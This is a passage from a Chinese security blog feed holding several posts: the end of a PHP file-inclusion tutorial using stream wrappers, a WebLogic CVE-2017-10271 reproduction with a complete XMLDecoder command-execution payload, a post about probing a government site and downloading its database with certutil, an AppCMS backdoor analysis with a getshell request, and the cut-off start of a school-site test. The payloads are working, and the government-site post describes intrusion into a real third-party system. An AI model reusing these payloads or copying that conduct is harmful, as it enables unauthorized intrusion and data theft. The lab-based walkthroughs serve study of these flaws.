alt="谈一谈文件包含漏洞"></p></li></ol><p>再来包含一下。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/15.png" alt="谈一谈文件包含漏洞"></p><p>可以看到这次包含后返回的信息就是我们目标机的信息。</p><p>接下来继续尝试拿shell<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/16.png" alt="谈一谈文件包含漏洞"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/17.png" alt="谈一谈文件包含漏洞"></p><p>远程文件包含的利用前提其实就是符合本地文件包含的前提并且符合远程文件包含本身的前提即可利用。</p><h2 id="文件包含之伪协议"><a href="#文件包含之伪协议" class="headerlink" title="文件包含之伪协议"></a>文件包含之伪协议</h2><hr><p>伪协议在文件包含的利用，本文演示以下伪协议：<br><code>data:text/plain</code> 或 <code>data:text/plain;base64</code><br><code>php://input</code><br><code>php://filter</code><br><code>file://</code><br><code>zip://</code></p><p>其它协议可阅读官方文档：<a href="http://php.net/manual/zh/wrappers.php.php" title="直通车">直通车</a></p><p>data:text/plain</p><p>直接在对应URL参数内输出：<code>data:text/plain</code>,需要执行的php代码  如下图：<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/18.png" alt="谈一谈文件包含漏洞"></p><p>这个伪协议还有另一种使用方法，那么就是将需要执行的php代码使用base64编码：<code>data:text/plain;base64</code>,需要执行的<code>base64php</code>代码 如下图：<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/19.png" alt="谈一谈文件包含漏洞"></p><hr><p> php://input</p><p><code>php://input</code> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/20.png" alt="谈一谈文件包含漏洞"></p><p>可以看到程序内是固定死后缀的，那么在包含 <code>php://input</code> 的时候就会自动拼接上 <code>.php</code> 所以肯定是不能正常使用 <code>php://input</code>的。所以我们也是可以使用 <code>%00</code> 截断的</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/22.png" alt="谈一谈文件包含漏洞"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/23.png" alt="谈一谈文件包含漏洞"></p><p>可以看到终止符是非常强大的。</p><hr><p>php://filter</p><p><code>php://filter</code> 该伪协议可以读取php文件代码以base64编码输出，比如说我们想读取一个php文件但是不想让它正常php执行代码后的结果，我们想要这个php文件的代码的时候就可以使用这个伪协议。<br>使用方法：php://filter/read=convert.base64-encode/resource=需要读取的文件代码内容</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/24.png" alt="谈一谈文件包含漏洞"></p><p>解码后可得到内容</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/25.png" alt="谈一谈文件包含漏洞"></p><hr><p>file://</p><p><code>file://</code> 用于访问本地文件系统，且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br>使用方法：file://文件绝对路径</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/26.png" alt="谈一谈文件包含漏洞"></p><hr><p>zip://</p><p><code>zip://</code>可以访问压缩文件中的文件。但是需要绝对路径。<br>使用方法：zip://[压缩包绝对路径]#[压缩文件内的文件名]</p><p>在本地创建一个文件，并且压缩成zip压缩包。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/27.png" alt="谈一谈文件包含漏洞"></p><p>可以看到我已经填写了绝对路径以及文件名称，但是为什么不能成功包含呢，可以看到它的报错 <code>Warning: include(zip://C:/phpStudy/WWW/include/phpinfo.zip.php) </code> 我们并不是包含这个文件，我们是要包含这个zip里面的文件，为什么<code>#</code>后面的值没了呢，是因为#会忽略后边的参数，所以我们需要使用编码<code>%23</code>的形式，还有一点就是程序里固定死了 php后缀，因为我们压缩的文件是为php后缀的。所以我们就不用带后缀了，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/28.png" alt="谈一谈文件包含漏洞"></p><p>转载自：<a href="http://www.bugsafe.cn/archives/167.html" title="http://www.bugsafe.cn/archives/167.html">http://www.bugsafe.cn/archives/167.html</a></p>]]></content>
    
    
    <categories>
      
      <category>学习文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Weblogic(CVE-2017-10271)漏洞复现 附POC</title>
    <link href="/p/2be8fb79.html"/>
    <url>/p/2be8fb79.html</url>
    
    <content type="html"><![CDATA[<p><code>最近的CVE-2017-10271也是引起了一个小风波，所以趁着网速好的时候下载了一个Weblogic搭建起来打算进行一次复现。</code></p><p>看了别人的漏洞复现教程 只看到了他怎么用exp怼成功，没写太明白我饶了不少弯子。</p><h4 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h4><p>CVE-2017-10271</p><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>Oracle WebLogic Server 10.3.6.0.0 版本<br>Oracle WebLogic Server 12.1.3.0.0 版本<br>Oracle WebLogic Server 12.2.1.1.0 版本</p><a id="more"></a><h4 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h4><p>Oracle Fusion Middleware 中的 Oracle WebLogic Server 组件的 WLS Security 子组件存<br>在安全漏洞。使用精心构造的 xml 数据可能造成任意代码执行，攻击者只需要发送精心构造<br>的 HTTP 请求，就可以拿到目标服务器的权限。攻击者可利用该漏洞控制组件，影响数据的<br>可用性、保密性和完整性。</p><h4 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h4><div class="note note-success">            <p>漏洞环境： Windows 2003 R2</p><p>漏洞版本文件：如果是土豪用户复制下面的链接</p><p><code>链接: https://pan.baidu.com/s/1hunIGTI 密码: h4qn</code></p><p>不是土豪用户那就去官方下载对应漏洞版本，不然百度云的限速，限到你怀疑人生是否被日</p><p>weblogic官网下载地址<code>http://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html</code></p>          </div><h4 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h4><p>下载完成安装方法 cmd命令：<code>cd C:\Program Files (x86)\Java\jdk1.7.0_80\bin</code> 这个目录下 执行 <code>java -jar xxx.jar（漏洞文件地址）</code> 每个人的java安装目录不一样，请自行改写。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171224_Weblogic_CVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0_%E9%99%84POC/01.png" alt="Weblogic(CVE-2017-10271)漏洞复现 附POC"></p><p>之后弹出配置界面我默认选择下一步。君随便！</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171224_Weblogic_CVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0_%E9%99%84POC/05.png" alt="Weblogic(CVE-2017-10271)漏洞复现 附POC"></p><p>安装完成</p><h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><p>如果访问/wls-wsat/CoordinatorPortType 目录，存在下图则说明或许存在漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171224_Weblogic_CVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0_%E9%99%84POC/02.png" alt="Weblogic(CVE-2017-10271)漏洞复现 附POC"></p><p><strong>1.访问我靶机地址。开启burp抓包</strong></p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">64.128</span>:<span class="hljs-number">7001</span><span class="hljs-regexp">/wls-wsat/</span>CoordinatorPortType</code></pre><p><strong>2.这是burp拦截到包是这样的</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /wls-wsat/CoordinatorPortType HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.64.128:7001</span><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">60</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3112</span>.<span class="hljs-number">113</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Cookie</span>: ADMINCONSOLESESSION=ogQg<span class="hljs-number">9</span>vh<span class="hljs-number">6</span>C<span class="hljs-number">79</span>piUJtLAFlnwm-QVVCJXULJJKsQ<span class="hljs-number">2</span>rFsLHj<span class="hljs-number">0</span>RJmHzs<span class="hljs-number">0</span>!<span class="hljs-number">1010165174</span><span class="hljs-attribute">Connection</span>: close</code></pre><p><strong>3.用下面poc替换刚刚你拦截的包，此时你的包变成下面内容。</strong></p><p>注意的是，在发送请求的时候，在请求头中必带<code>Upgrade-Insecure-Requests: 1</code>以及<code>Content-Type: text/xml</code>，否则是无法请求成功的。</p><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wls-wsat/CoordinatorPortType?wsdl</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 192.168.64.128:7001<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:57.0) Gecko/20100101 Firefox/57.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Cookie</span>: ADMINCONSOLESESSION=EyuBou39-ST7AlyotNoPLKktqrnsuRWG--n-h57dMpb9PsSnTdav!-2052172321<span class="hljs-attribute">Connection</span>: keep-alive<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Content-Length</span>: 944&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;     &lt;soapenv:Header&gt;        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;            &lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;                &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;                    &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;                        &lt;void index=&quot;0&quot;&gt;                            &lt;string&gt;cmd&lt;/string&gt;                        &lt;/void&gt;                        &lt;void index=&quot;1&quot;&gt;                            &lt;string&gt;/c&lt;/string&gt;                        &lt;/void&gt;                        &lt;void index=&quot;2&quot;&gt;                            &lt;string&gt;start xxx223 &lt;/string&gt;                        &lt;/void&gt;                    &lt;/array&gt;                &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;            &lt;/java&gt;        &lt;/work:WorkContext&gt;    &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;</code></pre><p><strong>4.发送到repeater测试（这里是使用的ProcessBuilder类进行的本地命令调用的）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171224_Weblogic_CVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0_%E9%99%84POC/03.png" alt="Weblogic(CVE-2017-10271)漏洞复现 附POC"></p><p><strong>6.看到返回信息代表成功去服务器看是不是已经添加好了；ok证明漏洞利用成功</strong></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171224_Weblogic_CVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0_%E9%99%84POC/04.png" alt="Weblogic(CVE-2017-10271)漏洞复现 附POC"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>Weblogic</tag>
      
      <tag>CVE-2017-10271</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一个项目中遇到的奇葩站点</title>
    <link href="/p/c972a5e6.html"/>
    <url>/p/c972a5e6.html</url>
    
    <content type="html"><![CDATA[<p>在做项目的时候遇到的一个gov，因为涉及一些敏感信息，就打重马了。</p><p>其他站太难搞了，挑个软柿子捏，当看到这个首页时，直觉就告诉我这站一定有问题。</p><a id="more"></a><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/01.png" alt="一个项目中遇到的奇葩站点"></p><p>习惯性的一拿到站就查看robots文件。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/02.png" alt="一个项目中遇到的奇葩站点"></p><p>简单的看了下服务器的架构，知道是iis7.5的，于是在该文件后尝试解析漏洞。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/03.png" alt="一个项目中遇到的奇葩站点"></p><p>没有报错，从经验来看，这页面风格确实是执行php脚本的风格。</p><p>然后在随便找了个图片尝试。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/04.png" alt="一个项目中遇到的奇葩站点"></p><p>猜测是该目录没有执行脚本的权限。</p><p>这时候本来想找到个上传点上传张图片马，然后尝试拿shell。</p><p>但此时我有个大胆的想法。将asp以php的方法来执行试试。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/05.png" alt="一个项目中遇到的奇葩站点"></p><p>报错了，源码也暴露了出来，然后祭出扫描器扫了一波敏感文件，找到了其配置文件。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/06.png" alt="一个项目中遇到的奇葩站点"></p><p>就这样，数据库路径找到了，当我去访问的时候却出现了意外。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/07.png" alt="一个项目中遇到的奇葩站点"></p><p>显示404，这尼玛什么鬼。。。</p><p>继续在后面加./php尝试，奇迹又出现了。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/08.png" alt="一个项目中遇到的奇葩站点"></p><p>这里用win自带的命令将其下载下来。</p><p><code>certutil -urlcache -split -f http://www.xxx.gov.cn/xxx.mdb/.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/09.png" alt="一个项目中遇到的奇葩站点"></p><p>将文件名修改为mdb，然后用破障打开找密码，却发现。。。。里面没密码。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/10.png" alt="一个项目中遇到的奇葩站点"></p><p>算了，利用此方法可以看到很多源代码。60个站点50个有狗，玩个锤子，有洞就不错了。这算个高危吧！！！就不继续深入了。</p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AppCMS 2.0.101 后门分析</title>
    <link href="/p/4a62cc6c.html"/>
    <url>/p/4a62cc6c.html</url>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><blockquote><p>下载地址：<a href="http://www.appcms.cc/html/gengxin.html">http://www.appcms.cc/html/gengxin.html</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171218_AppCMS_2.0.101_%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/01.png" alt="AppCMS 2.0.101 后门分析"></p><p>官方的更新时间是 2015-8-1</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>用beyond compare比较与前一个版本的区别</p><a id="more"></a><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171218_AppCMS_2.0.101_%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/02.png" alt="AppCMS 2.0.101 后门分析"></p><p>可以发现，在 templates/m/ 文件夹下出现了一个 content_list.php 文件，修改时间为 2017年5月25日。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171218_AppCMS_2.0.101_%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/03.png" alt="AppCMS 2.0.101 后门分析"></p><p>经过解密，<code>9c224bc6b59179729b15e1dddcbb5c82</code>为字符串<code>kejishidai</code>的md5值。</p><p>由代码知，这里存在一个copy函数构成的后门。</p><p>在第12行，实际执行的即为:</p><pre><code class="hljs php">copy(trim(<span class="hljs-variable">$_GET</span>[url]),<span class="hljs-variable">$_GET</span>[cms]);</code></pre><p>将参数url设置为<code>php://input</code>，参数cms设置为shell的文件名，然后POST传入webshell。如下：</p><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/content_list.php?session=kejishidai&amp;url=php://input&amp;cms=temp.php</span>POST:<span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171218_AppCMS_2.0.101_%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/04.png" alt="AppCMS 2.0.101 后门分析"></p><p>接着访问：</p><p><code>http://127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/temp.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171218_AppCMS_2.0.101_%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/05.png" alt="AppCMS 2.0.101 后门分析"></p><p>getshell。</p><h1 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h1><p>删除 templates/m/ 文件夹下的content_list.php。</p><p>转载自：<a href="https://chybeta.github.io/">https://chybeta.github.io</a>，</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>App CMS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>意外性的发现一套cms的注入漏洞</title>
    <link href="/p/aaddcbb1.html"/>
    <url>/p/aaddcbb1.html</url>
    
    <content type="html"><![CDATA[<p>事情是这样的，在一个老司机的群里聊天。。。。（是真的开车群）一个朋友说想叫我去检测下他们学校官网。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/01.png" alt="意外性的发现一套cms的注入漏洞"></p><p>我这么菜，还是去看看吧。。。。打开主站</p><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/02.png" alt="意外性的发现一套cms的注入漏洞"></p><p>访问robots.txt文件，是存在的，可以看出是isite的cms（在此之前听都没听过….）</p><a id="more"></a><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/03.png" alt="意外性的发现一套cms的注入漏洞"></p><p>去百度了下看下有啥公开的漏洞吧</p><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/04.png" alt="意外性的发现一套cms的注入漏洞"></p><p>不得不说。。。用的人真的少，这些漏洞都试了下，都没用啊。</p><p>还是看看后台吧，后面加个admin，得到后台之，各种弱口令，都没结果。</p><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/05.png" alt="意外性的发现一套cms的注入漏洞"></p><p>竟然这样，从旁站下手好了。查了下，有这么多</p><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/06.png" alt="意外性的发现一套cms的注入漏洞"></p><p>我一个个找过去……全是这套程序。。我也很无奈啊</p><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/07.png" alt="意外性的发现一套cms的注入漏洞"></p><p>没办法，硬着头皮看了看主站，随便点了个连接貌似伪静态啊。试了半天还是放弃了。</p><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/08.png" 